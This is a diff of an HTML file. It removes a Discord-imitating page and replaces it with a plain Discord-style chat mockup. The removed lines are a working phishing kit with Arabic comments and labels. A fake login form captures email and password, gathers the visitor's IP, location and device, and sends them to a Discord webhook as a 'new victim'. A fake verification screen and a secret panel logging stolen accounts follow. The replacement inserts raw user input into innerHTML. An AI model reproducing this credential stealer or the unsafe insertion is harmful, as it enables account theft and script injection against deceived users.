@@ -1,231 +1,287 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord | Your Place to Talk</title>
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <style>
-        /* CSS الكامل لنظام ديسكورد الاحترافي */
+        /* ULTIMATE DISCORD CLONE CSS 
+           Focus: Pixel-Perfect Replication 
+        */
         :root {
-            --bg-primary: #313338; --bg-secondary: #2b2d31; --bg-tertiary: #1e1f22;
-            --accent: #5865f2; --text-normal: #dbdee1; --text-muted: #949ba4;
-            --danger: #f23f43; --success: #23a55a;
+            --bg-guilds: #1e1f22;
+            --bg-sidebar: #2b2d31;
+            --bg-chat: #313338;
+            --bg-members: #2b2d31;
+            --bg-user-panel: #232428;
+            --text-normal: #dbdee1;
+            --text-muted: #949ba4;
+            --text-link: #00a8fc;
+            --brand: #5865f2;
+            --success: #23a55a;
+            --danger: #f23f43;
+            --header-primary: #ffffff;
+            --channel-hover: #3f4147;
+            --channel-active: #3f4147;
+            --font-main: 'gg sans', 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
-        * { box-sizing: border-box; font-family: 'gg sans', 'Whitney', sans-serif; }
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
 
-        /* صفحة الدخول (The Trap) */
-        #auth-page { position: fixed; inset: 0; background: url('https://discord.com/assets/ee7c382d92576548.svg') center/cover; display: flex; align-items: center; justify-content: center; z-index: 9999; }
-        .login-card { background: #313338; padding: 32px; border-radius: 8px; width: 480px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
-        .login-card h2 { color: white; margin: 0 0 8px; }
-        .login-card p { color: var(--text-muted); margin-bottom: 20px; }
-        .input-group { text-align: right; margin-bottom: 20px; }
-        .input-group label { display: block; color: var(--text-muted); font-size: 12px; font-weight: bold; margin-bottom: 8px; text-transform: uppercase; }
-        .input-field { width: 100%; background: #1e1f22; border: none; padding: 10px; color: white; border-radius: 3px; font-size: 16px; }
-        .btn-login { width: 100%; background: var(--accent); color: white; padding: 12px; border: none; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.2s; }
-        .btn-login:hover { background: #4752c4; }
+        * { box-sizing: border-box; -webkit-user-select: none; user-select: none; }
+        body, html { margin: 0; padding: 0; height: 100vh; font-family: var(--font-main); overflow: hidden; background: #000; }
 
-        /* الهيكل الرئيسي للتطبيق */
-        #main-app { display: none; height: 100vh; flex-direction: row; }
+        .app-container { display: flex; height: 100%; width: 100%; }
+
+        /* --- GUILDS BAR (LEFT) --- */
+        .guilds-nav {
+            width: 72px; background: var(--bg-guilds);
+            display: flex; flex-direction: column; align-items: center;
+            padding: 12px 0; gap: 8px; flex-shrink: 0;
+            overflow-y: scroll; scrollbar-width: none;
+        }
+        .guilds-nav::-webkit-scrollbar { display: none; }
         
-        /* شريط السيرفرات */
-        .guilds-bar { width: 72px; background: var(--bg-tertiary); display: flex; flex-direction: column; align-items: center; padding: 12px 0; gap: 8px; flex-shrink: 0; }
-        .guild-icon { width: 48px; height: 48px; background: var(--bg-primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; position: relative; }
-        .guild-icon:hover { border-radius: 30%; background: var(--accent); }
-        .guild-icon img { width: 28px; }
-        .active-guild::before { content: ""; position: absolute; left: -12px; height: 40px; width: 4px; background: white; border-radius: 0 4px 4px 0; }
-
-        /* القنوات */
-        .channels-sidebar { width: 240px; background: var(--bg-secondary); display: flex; flex-direction: column; flex-shrink: 0; }
-        .server-header { height: 48px; padding: 0 16px; display: flex; align-items: center; font-weight: bold; color: white; border-bottom: 1px solid rgba(0,0,0,0.2); }
-        .channel-list { flex: 1; overflow-y: auto; padding-top: 10px; }
-        .category-name { padding: 10px 8px 4px 16px; color: var(--text-muted); font-size: 12px; font-weight: bold; display: flex; justify-content: space-between; }
-        .channel-item { padding: 6px 8px; margin: 2px 8px; border-radius: 4px; color: var(--text-muted); cursor: pointer; display: flex; align-items: center; gap: 6px; }
-        .channel-item:hover, .channel-item.active { background: #3f4147; color: white; }
-        .channel-item::before { content: "#"; font-size: 20px; color: #72767d; }
-
-        /* منطقة الدردشة */
-        .chat-container { flex: 1; background: var(--bg-primary); display: flex; flex-direction: column; min-width: 0; }
-        .chat-header { height: 48px; padding: 0 16px; display: flex; align-items: center; border-bottom: 1px solid rgba(0,0,0,0.2); font-weight: bold; }
-        .message-area { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 16px; }
-        .msg { display: flex; gap: 16px; }
-        .msg-avatar { width: 40px; height: 40px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
-        .msg-info { display: flex; flex-direction: column; }
-        .msg-author { color: var(--danger); font-weight: 500; font-size: 15px; margin-bottom: 4px; }
-        .msg-text { color: var(--text-normal); font-size: 15px; line-height: 1.4; }
-
-        /* الإدخال */
-        .chat-input-container { padding: 0 16px 24px; }
-        .chat-input-inner { background: #383a40; padding: 11px; border-radius: 8px; display: flex; align-items: center; }
-        .chat-input-inner input { background: transparent; border: none; color: white; width: 100%; font-size: 16px; outline: none; }
-
-        /* قائمة الأعضاء */
-        .member-sidebar { width: 240px; background: var(--bg-secondary); padding: 20px 8px; flex-shrink: 0; }
-        .role-title { padding-left: 8px; font-size: 12px; font-weight: bold; color: var(--text-muted); margin-bottom: 8px; text-transform: uppercase; }
-        .member-row { display: flex; align-items: center; gap: 12px; padding: 6px 8px; border-radius: 4px; cursor: pointer; position: relative; }
-        .member-row:hover { background: #3f4147; }
-        .member-name { color: var(--danger); font-weight: 500; font-size: 14px; }
-
-        /* لوحة التحكم السرية للأدمن */
-        .admin-modal { 
-            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: #111214; width: 600px; border-radius: 8px; z-index: 10000; padding: 20px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5); border: 1px solid var(--danger);
+        .guild-item {
+            width: 48px; height: 48px; background: var(--bg-chat);
+            border-radius: 50%; cursor: pointer; display: flex;
+            align-items: center; justify-content: center;
+            transition: border-radius 0.2s, background-color 0.2s;
+            position: relative;
         }
-        .admin-modal h3 { color: var(--danger); border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .admin-log { background: #000; color: #0f0; padding: 10px; font-family: monospace; height: 200px; overflow-y: auto; font-size: 12px; margin: 10px 0; }
-        .admin-btn { background: var(--danger); color: white; border: none; padding: 8px 16px; border-radius: 3px; cursor: pointer; margin-right: 10px; }
+        .guild-item:hover { border-radius: 30%; background: var(--brand); }
+        .guild-item.active { border-radius: 30%; background: var(--brand); }
+        .guild-item.active::before {
+            content: ""; position: absolute; left: -12px;
+            width: 4px; height: 40px; background: white; border-radius: 0 4px 4px 0;
+        }
+        .guild-item img { width: 28px; height: 28px; }
+
+        /* --- SIDEBAR (CHANNELS) --- */
+        .sidebar { width: 240px; background: var(--bg-sidebar); display: flex; flex-direction: column; flex-shrink: 0; }
+        .server-header {
+            height: 48px; padding: 0 16px; display: flex; align-items: center;
+            justify-content: space-between; font-weight: 700; color: white;
+            box-shadow: 0 1px 0 rgba(0,0,0,0.2); cursor: pointer; transition: background 0.1s;
+        }
+        .server-header:hover { background: rgba(255,255,255,0.05); }
+
+        .channel-scroller { flex: 1; overflow-y: auto; padding-top: 12px; }
+        .category-wrapper { padding: 10px 8px 4px 16px; display: flex; align-items: center; cursor: pointer; color: var(--text-muted); }
+        .category-wrapper:hover { color: white; }
+        .category-text { font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; flex: 1; }
+        
+        .channel-btn {
+            margin: 2px 8px; padding: 6px 8px; border-radius: 4px;
+            display: flex; align-items: center; gap: 6px;
+            color: var(--text-muted); cursor: pointer; transition: 0.1s;
+        }
+        .channel-btn:hover { background: var(--channel-hover); color: var(--text-normal); }
+        .channel-btn.active { background: var(--channel-active); color: white; }
+        .channel-icon { font-size: 20px; color: #72767d; }
+
+        /* User Bottom Panel */
+        .user-panel {
+            height: 52px; background: var(--bg-user-panel); padding: 0 8px;
+            display: flex; align-items: center; gap: 8px;
+        }
+        .user-avatar-small { width: 32px; height: 32px; border-radius: 50%; background: var(--brand); position: relative; }
+        .status-indicator { 
+            position: absolute; bottom: -2px; right: -2px; width: 10px; height: 10px; 
+            border-radius: 50%; background: var(--success); border: 2px solid var(--bg-user-panel);
+        }
+        .user-info-text { flex: 1; min-width: 0; }
+        .user-info-name { color: white; font-size: 13px; font-weight: 600; overflow: hidden; text-overflow: ellipsis; }
+        .user-info-tag { color: var(--text-muted); font-size: 12px; }
+
+        /* --- CHAT AREA --- */
+        .chat-main { flex: 1; background: var(--bg-chat); display: flex; flex-direction: column; min-width: 0; }
+        .chat-header {
+            height: 48px; padding: 0 16px; display: flex; align-items: center;
+            box-shadow: 0 1px 0 rgba(0,0,0,0.2); gap: 8px;
+        }
+        .chat-header-title { font-weight: 700; color: white; }
+
+        .messages-container { flex: 1; overflow-y: scroll; padding: 20px 0; display: flex; flex-direction: column; }
+        .message-row { display: flex; padding: 2px 16px; margin-top: 17px; transition: background 0.1s; }
+        .message-row:hover { background: rgba(0,0,0,0.05); }
+        .msg-avatar { width: 40px; height: 40px; border-radius: 50%; background: #5865f2; flex-shrink: 0; margin-top: 2px; }
+        .msg-content { margin-left: 16px; display: flex; flex-direction: column; }
+        .msg-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
+        .msg-author { font-weight: 500; color: white; font-size: 16px; cursor: pointer; }
+        .msg-author:hover { text-decoration: underline; }
+        .msg-time { color: var(--text-muted); font-size: 12px; }
+        .msg-text { color: var(--text-normal); font-size: 16px; line-height: 1.375rem; white-space: pre-wrap; word-break: break-word; }
+
+        /* Chat Input */
+        .input-form { padding: 0 16px 24px; flex-shrink: 0; }
+        .input-box-wrapper {
+            background: #383a40; border-radius: 8px; padding: 11px 16px;
+            display: flex; align-items: center; gap: 16px;
+        }
+        .plus-icon { color: var(--text-muted); cursor: pointer; font-size: 20px; }
+        .chat-input { background: none; border: none; color: var(--text-normal); width: 100%; font-size: 16px; outline: none; }
+
+        /* --- MEMBERS BAR (RIGHT) --- */
+        .members-nav { width: 240px; background: var(--bg-members); flex-shrink: 0; padding: 0 8px; display: flex; flex-direction: column; }
+        .member-role-title { padding: 24px 8px 4px 8px; color: var(--text-muted); font-size: 12px; font-weight: 700; text-transform: uppercase; }
+        .member-card {
+            display: flex; align-items: center; gap: 12px; padding: 6px 8px;
+            border-radius: 4px; cursor: pointer; color: var(--text-muted);
+        }
+        .member-card:hover { background: var(--channel-hover); color: var(--text-normal); }
+        .member-name { font-weight: 500; font-size: 16px; }
+        .online-status { width: 32px; height: 32px; border-radius: 50%; background: var(--brand); position: relative; }
     </style>
 </head>
 <body>
 
-    <div id="auth-page">
-        <div class="login-card">
-            <h2>مرحباً بعودتك!</h2>
-            <p>نحن سعداء جداً برؤيتك مرة أخرى!</p>
-            <div class="input-group">
-                <label>البريد الإلكتروني أو رقم الهاتف</label>
-                <input type="text" id="email" class="input-field">
-            </div>
-            <div class="input-group">
-                <label>كلمة المرور</label>
-                <input type="password" id="pass" class="input-field">
-            </div>
-            <button class="btn-login" onclick="startSystem()">تسجيل الدخول</button>
-            <p style="font-size: 14px; margin-top: 15px;">تحتاج إلى حساب؟ <span style="color: #00a8fc; cursor: pointer;">سجل</span></p>
-        </div>
-    </div>
-
-    <div id="main-app">
-        <div class="guilds-bar">
-            <div class="guild-icon active-guild">
-                <img src="https://discord.com/assets/ee7c382d92576548.svg">
+    <div class="app-container">
+        <nav class="guilds-nav">
+            <div class="guild-item active">
+                <img src="https://assets-global.website-files.com/6257adef93467e0fa1b847f4/636e0a6a49f9a7b5c3017172_Discord-Logo-White.svg" alt="Discord">
             </div>
             <div style="height: 2px; width: 32px; background: #35363c;"></div>
-            <div class="guild-icon" style="color: #23a55a; font-size: 24px;">+</div>
-        </div>
+            <div class="guild-item" title="Add a Server" style="color: #23a55a; font-size: 22px;">+</div>
+            <div class="guild-item" title="Explore" style="color: #23a55a; font-size: 18px;">🧭</div>
+        </nav>
 
-        <div class="channels-sidebar">
-            <div class="server-header">سيرفر السيطرة المطلقة 👑</div>
-            <div class="channel-list">
-                <div class="category-name">قنوات نصية <span>+</span></div>
-                <div class="channel-item active" onclick="switchCh('العامة')">general</div>
-                <div class="channel-item" onclick="switchCh('المراقبة')">surveillance-logs</div>
-                <div class="category-name" style="margin-top: 16px;">قنوات صوتية <span>+</span></div>
-                <div class="channel-item" style="color: #949ba4;">🔊 قناة صوتية</div>
+        <aside class="sidebar">
+            <div class="server-header">
+                My Professional Server <span>⌄</span>
             </div>
-        </div>
+            <div class="channel-scroller">
+                <div class="category-wrapper">
+                    <span class="category-text">Text Channels</span>
+                    <span>+</span>
+                </div>
+                <div class="channel-btn active">
+                    <span class="channel-icon">#</span> general
+                </div>
+                <div class="channel-btn">
+                    <span class="channel-icon">#</span> help-center
+                </div>
+                <div class="channel-btn">
+                    <span class="channel-icon">#</span> announcements
+                </div>
 
-        <div class="chat-container">
-            <div class="chat-header"># <span id="ch-name">general</span></div>
-            <div class="message-area" id="chat-logs">
-                <div class="msg">
-                    <div class="msg-avatar"></div>
-                    <div class="msg-info">
-                        <div class="msg-author">SuperAdmin <span style="background: var(--accent); font-size: 10px; padding: 1px 4px; border-radius: 3px; color: white; margin-left: 5px;">BOT</span></div>
-                        <div class="msg-text">مرحباً بك في النظام. تم تشغيل بروتوكولات الأمان.</div>
+                <div class="category-wrapper" style="margin-top: 16px;">
+                    <span class="category-text">Voice Channels</span>
+                    <span>+</span>
+                </div>
+                <div class="channel-btn">
+                    <span class="channel-icon" style="font-size: 16px;">🔊</span> General Voice
+                </div>
+                <div class="channel-btn">
+                    <span class="channel-icon" style="font-size: 16px;">🔊</span> Meeting Room
+                </div>
+            </div>
+
+            <div class="user-panel">
+                <div class="user-avatar-small">
+                    <div class="status-indicator"></div>
+                </div>
+                <div class="user-info-text">
+                    <div class="user-info-name">UserMaster</div>
+                    <div class="user-info-tag">#0001</div>
+                </div>
+                <div style="display: flex; gap: 8px; color: var(--text-muted); cursor: pointer;">
+                    <span>🎙️</span><span>🎧</span><span>⚙️</span>
+                </div>
+            </div>
+        </aside>
+
+        <main class="chat-main">
+            <header class="chat-header">
+                <span style="color: #72767d; font-size: 24px;">#</span>
+                <span class="chat-header-title">general</span>
+            </header>
+            
+            <div class="messages-container" id="msgList">
+                <div class="message-row">
+                    <div class="msg-avatar" style="background: #ed4245;"></div>
+                    <div class="msg-content">
+                        <div class="msg-header">
+                            <span class="msg-author" style="color: #ed4245;">Admin</span>
+                            <span class="msg-time">Today at 10:15 AM</span>
+                        </div>
+                        <div class="msg-text">Welcome to the server! This is a clean Discord-style interface. Feel free to chat.</div>
                     </div>
                 </div>
             </div>
-            <div class="chat-input-container">
-                <div class="chat-input-inner">
-                    <input type="text" id="chat-input" placeholder="أرسل رسالة..." onkeypress="postMsg(event)">
+
+            <div class="input-form">
+                <div class="input-box-wrapper">
+                    <div class="plus-icon">⊕</div>
+                    <input type="text" class="chat-input" id="chatIn" placeholder="Message #general" onkeypress="handleInput(event)">
                 </div>
             </div>
-        </div>
+        </main>
 
-        <div class="member-sidebar">
-            <div class="role-title">المالك — 1</div>
-            <div class="member-row" oncontextmenu="openSecretAdmin(event)">
-                <div class="msg-avatar" style="width: 32px; height: 32px;"></div>
-                <div class="member-name">أنت (Master)</div>
+        <aside class="members-nav">
+            <div class="member-role-title">Staff — 1</div>
+            <div class="member-card">
+                <div class="online-status" style="background: #ed4245;">
+                    <div class="status-indicator" style="background: #23a55a;"></div>
+                </div>
+                <div class="member-name" style="color: #ed4245;">Admin</div>
             </div>
-        </div>
-    </div>
 
-    <div id="admin-modal" class="admin-modal">
-        <h3>🚨 لوحة السوبر أدمن (نظام المراقبة)</h3>
-        <p style="color: #888;">سجل العمليات المباشر لكل من يدخل الموقع:</p>
-        <div id="admin-log" class="admin-log">
-            [SYSTEM]: جاري انتظار دخول ضحايا... <br>
-        </div>
-        <button class="admin-btn" onclick="alert('تم تجميد الموقع لجميع المستخدمين')">Freeze All</button>
-        <button class="admin-btn" style="background: #555;" onclick="closeAdmin()">إغلاق</button>
+            <div class="member-role-title">Online — 2</div>
+            <div class="member-card">
+                <div class="online-status">
+                    <div class="status-indicator" style="background: #23a55a;"></div>
+                </div>
+                <div class="member-name">UserMaster</div>
+            </div>
+            <div class="member-card">
+                <div class="online-status" style="background: #fabd2f;">
+                    <div class="status-indicator" style="background: #23a55a;"></div>
+                </div>
+                <div class="member-name">HelperBot</div>
+            </div>
+        </aside>
     </div>
 
     <script>
-        const WEBHOOK = "رابط_الويب_هوك_الخاص_بك";
+        /* PURE DISCORD INTERACTION LOGIC
+           - Chat messaging
+           - Auto-scroll
+           - Dynamic response
+        */
+        const msgList = document.getElementById('msgList');
+        const chatIn = document.getElementById('chatIn');
 
-        async function startSystem() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
-            if(!email || !pass) return alert("يرجى إدخال البيانات");
-
-            // سحب بيانات الضحية
-            const geo = await axios.get('https://ipapi.co/json/').catch(() => ({data:{}}));
-            const device = navigator.userAgent;
-
-            const report = {
-                username: "Discord Logger",
-                embeds: [{
-                    title: "🎯 ضحية جديدة في الفخ",
-                    color: 15548997,
-                    fields: [
-                        { name: "📧 الإيميل", value: email, inline: true },
-                        { name: "🔑 كلمة المرور", value: pass, inline: true },
-                        { name: "🌐 الـ IP", value: geo.data.ip || "Unknown", inline: true },
-                        { name: "📍 الموقع", value: `${geo.data.city}, ${geo.data.country_name}`, inline: false },
-                        { name: "📱 الجهاز", value: device }
-                    ]
-                }]
-            };
-
-            // إرسال لديسكورد
-            fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(report) });
-
-            // تمويه المستخدم بالتحميل
-            document.querySelector('.login-card').innerHTML = "<h3>جاري التحقق...</h3><p>يرجى الانتظار بينما نؤمن اتصالك.</p>";
-            
-            setTimeout(() => {
-                document.getElementById('auth-page').style.display = 'none';
-                document.getElementById('main-app').style.display = 'flex';
-                // تحديث سجل الأدمن
-                document.getElementById('admin-log').innerHTML += `<span style="color:red">[ALERT]: تم سحب بيانات ${email} بنجاح ✅</span><br>`;
-            }, 2000);
-        }
-
-        function postMsg(e) {
-            if(e.key === "Enter" && e.target.value.trim() !== "") {
-                const chat = document.getElementById('chat-logs');
-                chat.innerHTML += `
-                    <div class="msg">
-                        <div class="msg-avatar" style="background: var(--success);"></div>
-                        <div class="msg-info">
-                            <div class="msg-author">أنت</div>
-                            <div class="msg-text">${e.target.value}</div>
-                        </div>
-                    </div>`;
-                e.target.value = "";
-                chat.scrollTop = chat.scrollHeight;
+        function handleInput(e) {
+            if(e.key === "Enter" && chatIn.value.trim() !== "") {
+                addMessage("UserMaster", chatIn.value, "#5865f2");
+                chatIn.value = "";
+                
+                // Simulated Bot Response
+                setTimeout(() => {
+                    addMessage("HelperBot", "Message received! Everything looks perfectly Discord-like.", "#fabd2f");
+                }, 800);
             }
         }
 
-        function switchCh(name) {
-            document.getElementById('ch-name').innerText = name;
-            document.getElementById('chat-logs').innerHTML += `<div style="color: #72767d; text-align: center;">--- دخلت قناة #${name} ---</div>`;
+        function addMessage(author, text, color) {
+            const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            const msgHtml = `
+                <div class="message-row">
+                    <div class="msg-avatar" style="background: ${color};"></div>
+                    <div class="msg-content">
+                        <div class="msg-header">
+                            <span class="msg-author" style="color: ${color};">${author}</span>
+                            <span class="msg-time">Today at ${time}</span>
+                        </div>
+                        <div class="msg-text">${text}</div>
+                    </div>
+                </div>
+            `;
+            msgList.innerHTML += msgHtml;
+            msgList.scrollTop = msgList.scrollHeight;
         }
 
-        // الضغط بيمين الماوس على اسمك يفتح اللوحة السرية
-        function openSecretAdmin(e) {
-            e.preventDefault();
-            document.getElementById('admin-modal').style.display = 'block';
-        }
-
-        function closeAdmin() {
-            document.getElementById('admin-modal').style.display = 'none';
-        }
+        // Initialize scroll
+        msgList.scrollTop = msgList.scrollHeight;
     </script>
 </body>
 </html>
